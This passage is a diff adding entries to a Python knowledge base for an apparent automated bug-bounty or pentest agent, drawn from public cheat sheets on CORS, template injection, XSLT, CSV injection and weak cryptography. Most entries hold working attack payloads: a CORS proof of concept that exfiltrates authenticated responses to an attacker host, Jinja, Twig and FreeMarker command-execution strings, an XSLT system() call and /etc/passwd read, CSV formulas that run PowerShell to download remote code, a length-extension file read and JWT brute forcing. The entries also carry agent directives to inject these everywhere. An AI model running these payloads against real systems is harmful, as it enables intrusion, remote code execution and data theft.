+   * GIT como recon tool (bugbountytips Tip#1)
+   * GitLab /explore sem auth (Tip#2)
+   * Hackathon assets (Tip#5)
+""",
+        "impact": "Sem orquestracao recon-first, ferramentas pesadas (sqlmap, nuclei) rodam no escuro: caro, ruidoso, e produz FP. Com hipoteses, cada execucao tem PoC predizivel.",
+        "remediation": "n/a (este e um learning de metodologia, nao de defesa).",
+        "learned_mission": "Antes de qualquer execucao em VULN_ANAL ou EXPLOITATION, o supervisor DEVE consultar o engine de hipoteses. Hipotese tem campos {target, param, signal_esperado, confidence}. Se a hipotese nao existe, o tool nao executa.",
+        "learned_prompt": "Don't run sqlmap unless there's a URL param. Don't run dalfox unless something reflects. Don't run wpscan unless WordPress detected. Every tool maps 1:1 to a recon-derived hypothesis.",
+        "affected_phases": ["P01", "P02", "P03", "P04", "P05", "P06"],
+        "affected_skills": [
+            "asset_discovery", "reconnaissance", "recon-subdomain-enum",
+            "recon-web-crawl", "recon-port-service", "tech-http-fingerprint",
+        ],
+        "recommended_tools": [
+            "subfinder", "amass", "assetfinder", "dnsx", "httpx", "naabu", "nmap",
+            "katana", "gau", "waybackurls", "arjun", "paramspider", "whatweb", "curl-headers",
+        ],
+        "learned_techniques": [
+            {"name": "Cert transparency mining", "phase": "P01", "tool": "curl-headers"},
+            {"name": "Passive subdomain pipeline", "phase": "P01", "tool": "subfinder"},
+            {"name": "Active resolve + probe", "phase": "P02", "tool": "httpx"},
+            {"name": "JS endpoint mining", "phase": "P03", "tool": "katana"},
+            {"name": "Parameter discovery", "phase": "P04", "tool": "arjun"},
+            {"name": "Hypothesis generation from evidence", "phase": "P05", "tool": "curl-headers"},
+        ],
+    },
+    # ─────────────────────────────────────────────────────────────────────
+    # CORS misconfig — curl-based PoC
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "CORS misconfiguration probe (EdOverflow cors.md)",
+        "vulnerability_type": "CORS Misconfiguration",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/cors.md"],
+        "summary": "Detecta CORS misconfig que permite leitura cross-origin com credenciais. Hipotese: 'API aceita Origin de qualquer dominio e devolve ACAC=true'.",
+        "steps_to_reproduce": """
+1) Verificar reflexao do Origin:
+   curl -sk --head 'https://T/api/v1/me' -H 'Origin: https://evil.com' | grep -iE 'access-control-allow-(origin|credentials)'
+
+2) Confirmar pre-flight:
+   curl -sk -i -X OPTIONS 'https://T/api/v1/me' \\
+        -H 'Origin: https://evil.com' \\
+        -H 'Access-Control-Request-Method: GET' \\
+        -H 'Access-Control-Request-Headers: Authorization'
+
+3) Bandeira critica (vulneravel):
+   Access-Control-Allow-Origin: https://evil.com
+   Access-Control-Allow-Credentials: true
+
+4) Variantes de bypass:
+   curl -sk --head 'https://T/api' -H 'Origin: https://T.evil.com'      # subdominio attacker
+   curl -sk --head 'https://T/api' -H 'Origin: null'                     # null origin
+   curl -sk --head 'https://T/api' -H 'Origin: https://T'                # cliente-mesmo-dominio? checa enforcement
+
+5) PoC HTML (capture):
+   <script>
+     fetch('https://T/api/v1/me', {credentials:'include'})
+       .then(r=>r.text()).then(t=>fetch('https://attacker/?d='+btoa(t)));
+   </script>
+""",
+        "impact": "Leak de dados autenticados (perfil, sessao, JWT) para origin atacante, account takeover via leak de token, leitura de endpoints internos quando session cookie e enviada.",
+        "remediation": "Allowlist explicito de origins; nunca refletir o Origin do request; quando credentials=true, ACAO precisa ser dominio especifico (nao *).",
+        "learned_mission": "Para toda API com Authorization/Cookie, rodar `curl --head -H 'Origin: https://evil.com'` no minimo 1x e checar ACAO+ACAC.",
+        "learned_prompt": "Probe Access-Control-Allow-Origin reflection with Origin: https://evil.com. If Allow-Credentials=true and ACAO=evil, mark CORS misconfig critical.",
+        "affected_phases": ["P05", "P16"],
+        "affected_skills": ["risk_assessment", "tech-http-fingerprint", "vuln-information-disclosure", "vuln-api-graphql"],
+        "recommended_tools": ["curl", "curl-headers", "nuclei", "wapiti"],
+        "learned_techniques": [
+            {"name": "CORS Origin reflection", "phase": "P05", "tool": "curl-headers"},
+            {"name": "CORS pre-flight test", "phase": "P05", "tool": "curl-headers"},
+            {"name": "CORS null/subdomain bypass", "phase": "P05", "tool": "curl-headers"},
+        ],
+    },
+    # ─────────────────────────────────────────────────────────────────────
+    # Template Injection (Ruby/Twig/Jinja/Smarty/FreeMarker)
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "SSTI - server-side template injection (EdOverflow template-injection.md)",
+        "vulnerability_type": "Template Injection",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/template-injection.md"],
+        "summary": "Hipotese: 'Input do usuario chega num render de template (Jinja/Twig/Ruby/FreeMarker)'. Probe deterministico: enviar {{7*'7'}} e verificar se body retorna 7777777 (Jinja) ou 49 (Twig).",
+        "steps_to_reproduce": """
+0) Pontos de injecao tipicos:
+   - email subject/body, name, search, comentario, profile bio
+   - error pages refletindo o input
+   - PDF/Word generators que recebem texto
+
+1) Probe Jinja2 / Twig:
+   curl -sk "https://T/?name={{7*7}}"        # render '49' se Twig/Jinja
+   curl -sk "https://T/?name={{7*'7'}}"      # '49' Twig, '7777777' Jinja
+   curl -sk "https://T/?name=${7*7}"         # FreeMarker, Spring, JSP EL
+   curl -sk "https://T/?name=<%=7*7%>"       # Ruby ERB, ASP
+
+2) Probe Ruby:
+   curl -sk "https://T/?name=<%=\\`id\\`%>"
+   curl -sk "https://T/?name=#{7*7}"
+
+3) Confirmar engine (Jinja exec):
+   curl -sk "https://T/?name={{config.items()}}"
+   curl -sk "https://T/?name={{''.__class__.__mro__[2].__subclasses__()}}"
+   curl -sk "https://T/?name={{cycler.__init__.__globals__.os.popen('id').read()}}"
+
+4) Twig exec:
+   curl -sk "https://T/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+
+5) FreeMarker:
+   curl -sk "https://T/?name=<#assign x=\"freemarker.template.utility.Execute\"?new()>\${x('id')}"
+
+EVIDENCE TO CAPTURE:
+  - resposta contem '49', '7777777' ou output de comando
+  - stacktrace mencionando jinja2, twig, freemarker
+""",
+        "impact": "RCE em alguns engines (Jinja/Twig/Ruby ERB), leak de variaveis internas (env, secrets), DoS via {{7*''*}}.",
+        "remediation": "Nunca renderizar input do usuario via Template.render(); usar sandbox; allowlist de filtros; PreCompiled templates.",
+        "learned_mission": "Em todo campo refletido que NAO escapa caracteres { } < > %, enviar {{7*'7'}} e ${7*7}. Se houve mudanca no output -> SSTI candidato.",
+        "learned_prompt": "Inject {{7*'7'}}, ${7*7}, <%=7*7%>, #{7*7} in every reflected field. Confirm engine via subclass walk for Jinja, registerUndefinedFilterCallback for Twig.",
+        "affected_phases": ["P12", "P14"],
+        "affected_skills": ["risk_assessment", "vuln-injection"],
+        "recommended_tools": ["curl", "curl-headers", "dalfox", "wapiti", "nuclei"],
+        "learned_techniques": [
+            {"name": "Jinja/Twig probe 7*'7'", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Ruby ERB probe <%=`id`%>", "phase": "P12", "tool": "curl-headers"},
+            {"name": "FreeMarker Execute.new()", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Jinja subclass RCE", "phase": "P12", "tool": "curl-headers"},
+        ],
+    },
+    # ─────────────────────────────────────────────────────────────────────
+    # XSLT injection
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "XSLT injection (EdOverflow xslt.md)",
+        "vulnerability_type": "XSLT Injection",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xslt.md"],
+        "summary": "Hipotese: 'endpoint aceita XML/XSL p/ transformacao (PDF gen, RSS, SOAP, sitemap)'. Probe: vendor disclosure + PHP function call.",
+        "steps_to_reproduce": """
+1) Vendor/version disclosure:
+   curl -sk -X POST 'https://T/transform' -H 'Content-Type: application/xml' --data '
+   <?xml version="1.0"?>
+   <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+     <body>
+       <xsl:value-of select="system-property(\\'xsl:vendor\\')"/>
+       <xsl:value-of select="system-property(\\'xsl:version\\')"/>
+     </body>
+   </html>'
+
+2) PHP function execution (php-xsl loaded):
+   <xsl:value-of name="x" select="php:function('phpinfo')"/>
+   <xsl:value-of name="x" select="php:function('system','id')"/>
+
+3) File read via document():
+   <xsl:value-of select="document('file:///etc/passwd')"/>
+
+EVIDENCE TO CAPTURE:
+  - vendor revelado (libxslt/Saxon/Xalan)
+  - phpinfo() / id output no body
+""",
+        "impact": "RCE em libxslt+php-xsl, file read via document(), DoS via include recursivo.",
+        "remediation": "Desabilitar php:function via XSLTProcessor::registerPHPFunctions(false); allowlist de stylesheets; rejeitar input externo.",
+        "learned_mission": "Endpoints PDF/RSS/SOAP que aceitam XML + transformacao XSL devem receber probe de system-property('xsl:vendor') antes de qualquer exploit.",
+        "learned_prompt": "Send XSL document with system-property('xsl:vendor'). If output reveals vendor, escalate to php:function('system','id').",
+        "affected_phases": ["P12"],
+        "affected_skills": ["risk_assessment", "vuln-injection"],
+        "recommended_tools": ["curl", "curl-headers", "wapiti"],
+        "learned_techniques": [
+            {"name": "XSL vendor disclosure", "phase": "P12", "tool": "curl-headers"},
+            {"name": "XSL php:function RCE", "phase": "P12", "tool": "curl-headers"},
+        ],
+    },
+    # ─────────────────────────────────────────────────────────────────────
+    # CSV injection (Excel formulas)
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "CSV / Spreadsheet formula injection (EdOverflow csv-injection.md)",
+        "vulnerability_type": "CSV Injection",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/csv-injection.md"],
+        "summary": "Hipotese: 'aplicacao exporta dados de usuario para CSV/Excel (relatorio, billing, lista de usuarios)'. Payload comeca com =,+,-,@ e injeta formula DDE quando aberto.",
+        "steps_to_reproduce": """
+1) Pontos de injecao tipicos:
+   - nome, email, descricao, tags
+   - qualquer field que aparece em export CSV/XLSX
+
+2) Payloads (postar no field e depois requisitar export):
+   =cmd|'/C calc'!A0
+   =cmd|'/C powershell IEX(wget bit.ly/1X146m3)'!A0
+   %0A-3+3+cmd|'/C calc'!D2
+   @SUM(1+1)*cmd|'/C calc'!A0
+   +cmd|'/C calc'!A0
+   -cmd|'/C calc'!A0
+   =HYPERLINK("http://attacker/?x="&A1,"click")
+
+3) Confirmacao:
+   curl -sk 'https://T/export.csv' -H 'Cookie: session=...' | head
+   # Se vier sem prefixo de escape ('), e vulneravel
+""",
+        "impact": "RCE no cliente que abre o CSV (Excel/LibreOffice), exfiltracao de dados via HYPERLINK formula, phishing intra-org.",
+        "remediation": "Prefixar campos comecando com =,+,-,@ com aspa simples; usar XLSX em vez de CSV; sanitizar antes do export.",
+        "learned_mission": "Toda aplicacao SaaS B2B que exporta CSV deve receber probe de '=cmd|...' em campos persistidos. Hipotese surge quando ha endpoint /export.* ou /report.*",
+        "learned_prompt": "POST a field containing =cmd|'/C calc'!A0 then GET /export.csv. Check if payload renders literal in CSV.",
+        "affected_phases": ["P12", "P14"],
+        "affected_skills": ["risk_assessment", "vuln-injection"],
+        "recommended_tools": ["curl", "curl-headers"],
+        "learned_techniques": [
+            {"name": "CSV formula injection", "phase": "P12", "tool": "curl-headers"},
+            {"name": "Excel HYPERLINK exfil", "phase": "P12", "tool": "curl-headers"},
+        ],
+    },
+    # ─────────────────────────────────────────────────────────────────────
+    # Crypto: MD5/SHA-1 collision + length extension + bcrypt
+    # ─────────────────────────────────────────────────────────────────────
+    {
+        "title": "Crypto weaknesses - MD5/SHA-1 collisions, length-ext, bcrypt wraparound",
+        "vulnerability_type": "Cryptographic Weakness",
+        "source_kind": "vendor_cheatsheet",
+        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crypto.md"],
+        "summary": "Hipotese: 'aplicacao usa hash fraco (MD5/SHA-1) ou MAC sem HMAC, ou bcrypt $2a$ vulneravel a wraparound'. Sinais: assinatura visivel na URL, JWT HS256 com secret previsivel, comprimento de hash 32/40.",
+        "steps_to_reproduce": """
+1) Detectar hash fraco em URLs/parametros:
+   curl -sk -I 'https://T/file?id=1&mac=<hash>' | grep -oE '[a-f0-9]{32,40}'
+   # 32 chars hex -> MD5; 40 chars -> SHA-1; 64 -> SHA-256
+
+2) MD5 collision strings (validar uso pre-hash):
+   - dois prefixos hex diferentes que colidem em MD5 (lista no crypto.md)
+   - se o servidor aceita ambos como assinatura valida -> MD5 quebrado
+
+3) SHA-1 shattered.io PDFs:
+   - 2 PDFs com SHA-1 igual e conteudo diferente
+   - upload ambos: se considerado o mesmo arquivo -> SHA-1 quebrado
+
+4) Length-extension attack (MAC sem HMAC):
+   # original
+   curl -sk 'https://T/download?file=report.pdf&mac=563162c9c71a17367d44c165b84b85ab59d036f9'
+   # com hash_extender (https://github.com/iagox86/hash_extender)
+   hash_extender --data 'file=report.pdf' --secret <len> --append '&file=/etc/passwd' \\
+                 --signature 563162c9c71a17367d44c165b84b85ab59d036f9 --format sha1
+   # Re-enviar com nova mac
+   curl -sk 'https://T/download?file=report.pdf%00...%80...%2F..%2Fetc%2Fpasswd&mac=<novo>'
+
+5) Bcrypt $2a$ wraparound (senhas > 72 chars):
+   curl -sk -X POST https://T/login -d 'username=admin&password=' # senha de 73+ chars iguais ate o 72 logam
+
+6) JWT HS256 brute:
+   jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
+   jwt_tool <token> -X k  # confusao kid
+
+EVIDENCE TO CAPTURE:
+  - aceita ambas strings com MD5 igual -> CVSS high
+  - extensao bem-sucedida muda comportamento sem falhar mac -> high
+  - JWT secret quebrado -> critical
+""",
+        "impact": "Forjar assinaturas (download links, password reset, MAC), bypass de integrity, account takeover via JWT.",
+        "remediation": "Usar HMAC-SHA256 minimo, JWT com RS256/EdDSA, bcrypt com cost>=12 e limitar password length, abandonar MD5/SHA-1.",
+        "learned_mission": "Toda URL ou cookie com hex de 32/40 chars merece probe de hash-extension e collision. JWT HS256 sempre passa por jwt_tool brute curto.",
+        "learned_prompt": "Detect 32-char hex -> MD5 weak. 40-char -> SHA-1. Try hash_extender with 8..64 byte secret lengths. JWT HS256 -> jwt_tool -C wordlist.",
+        "affected_phases": ["P14", "P22"],
+        "affected_skills": ["risk_assessment", "weak-cryptography", "vuln-auth-bypass"],
+        "recommended_tools": ["curl", "curl-headers", "jwt_tool", "hashcat"],
+        "learned_techniques": [
+            {"name": "MD5 collision PoC", "phase": "P14", "tool": "curl-headers"},
+            {"name": "SHA-1 length extension", "phase": "P14", "tool": "curl-headers"},
+            {"name": "Bcrypt 72-char wraparound", "phase": "P14", "tool": "curl-headers"},
+            {"name": "JWT HS256 brute", "phase": "P14", "tool": "jwt_tool"},
+        ],
+    },
 ]
 
 
